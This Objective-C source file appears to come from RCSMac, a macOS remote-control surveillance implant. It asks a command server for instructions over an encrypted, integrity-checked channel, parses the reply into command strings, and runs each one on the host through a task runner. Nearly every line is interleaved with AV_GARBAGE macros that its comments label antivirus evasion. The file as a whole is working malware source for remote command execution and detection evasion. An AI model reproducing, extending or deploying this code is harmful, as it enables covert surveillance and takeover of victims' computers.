//
//  CommandsNetworkOperation.m
//  RCSMac
//
//  Created by armored on 1/29/13.
//
//

#import "RCSMCommon.h"

#import "CommandsNetworkOperation.h"

#import "NSString+SHA1.h"
#import "NSData+SHA1.h"
#import "NSMutableData+AES128.h"
#import "NSMutableData+SHA1.h"
#import "NSData+Pascal.h"
#import "RCSMTaskManager.h"
#import "RCSMLogManager.h"
#import "RCSMTask.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"


@implementation CommandsNetworkOperation

@synthesize mCommands;

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if (self = [super init])
  {
    mTransport = aTransport;
    mCommands = [[NSMutableArray alloc] init];
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    return self;
  }
  
  return nil;
}

- (void)dealloc
{
  [mCommands release];
  [super dealloc];
}

- (BOOL)perform
{
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  int32_t i = 0;
  uint32_t command = PROTO_COMMANDS;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSMutableData *commandData = [[NSMutableData alloc] initWithBytes: &command
                                                             length: sizeof(uint32_t)];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSData *commandSha = [commandData sha1Hash];
  [commandData appendData: commandSha];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [commandData encryptWithKey: gSessionKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  NSMutableData *replyDecrypted = nil;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  if (replyData == nil)
  {
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    [commandData release];
    [outerPool release];
    
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    return NO;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  [replyDecrypted decryptWithKey: gSessionKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [replyDecrypted getBytes: &command
                    length: sizeof(uint32_t)];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  // remove padding
  [replyDecrypted removePadding];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  @try
  {
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    shaRemote = [replyDecrypted subdataWithRange:
                 NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                             CC_SHA1_DIGEST_LENGTH)];
    
    // AV evasion: only on release build
    AV_GARBAGE_009
    
    shaLocal = [replyDecrypted subdataWithRange:
                NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
    
    // AV evasion: only on release build
    AV_GARBAGE_002
  }
  @catch (NSException *e)
  {
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    [replyDecrypted release];
    [commandData release];
    [outerPool release];
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    return NO;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  shaLocal = [shaLocal sha1Hash];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if ([shaRemote isEqualToData: shaLocal] == NO)
  {
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    [replyDecrypted release];
    [commandData release];
    [outerPool release];
    
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    return NO;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  if (command != PROTO_OK)
  {
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    
    [replyDecrypted release];
    [commandData release];
    [outerPool release];
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    return NO;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  uint32_t numOfStrings = 0;
  @try
  {
    [replyDecrypted getBytes: &numOfStrings
                       range: NSMakeRange(8, sizeof(uint32_t))];
  }
  @catch (NSException *e)
  {
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    [replyDecrypted release];
    [commandData release];
    [outerPool release];
    
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    return NO;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  
  if (numOfStrings == 0)
  {
    // AV evasion: only on release build
    AV_GARBAGE_007
    
    [replyDecrypted release];
    [commandData release];
    [outerPool release];
    
    // AV evasion: only on release build
    AV_GARBAGE_009
    
    return NO;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  uint32_t stringDataSize = 0;
  NSMutableData *strings;
  @try
  {
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    [replyDecrypted getBytes: &stringDataSize
                       range: NSMakeRange(4, sizeof(uint32_t))];
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    strings = [NSMutableData dataWithData:
               [replyDecrypted subdataWithRange: NSMakeRange(12, stringDataSize)]];
    
    // AV evasion: only on release build
    AV_GARBAGE_003
  }
  @catch (NSException *e)
  {
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    return NO;
  }
  
  uint32_t len = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  //
  // Unpascalize n NULL terminated UTF16LE strings
  //
  NSData *stringData;
  
  for (i = 0; i < numOfStrings; i++)
  {
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    [strings getBytes: &len length: sizeof(uint32_t)];
    @try
    {
      stringData  = [strings subdataWithRange: NSMakeRange(0, len + 4)];
    }
    @catch (NSException *e)
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      return NO;
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    NSString *string = [stringData unpascalizeToStringWithEncoding: NSUTF16LittleEndianStringEncoding];
    
    // AV evasion: only on release build
    AV_GARBAGE_007
    
    if (string == nil)
    {
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      return NO;
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_007
    
    [mCommands addObject: string];
    
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    @try
    {
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      [strings replaceBytesInRange: NSMakeRange(0, len + 4)
                         withBytes: NULL
                            length: 0];
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
    }
    @catch (NSException *e)
    {
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [replyDecrypted release];
  [commandData release];
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return YES;
}

- (BOOL)executeCommands
{
  for (int i=0; i < [mCommands count]; i++)
  {
    NSString *tmpCmd = [mCommands objectAtIndex:i];
    
    __m_Task *tsk = [[__m_Task alloc] init];
    
    [tsk performCommand:tmpCmd];
    
    [tsk release];
  
  }
  
  return TRUE;
}
@end
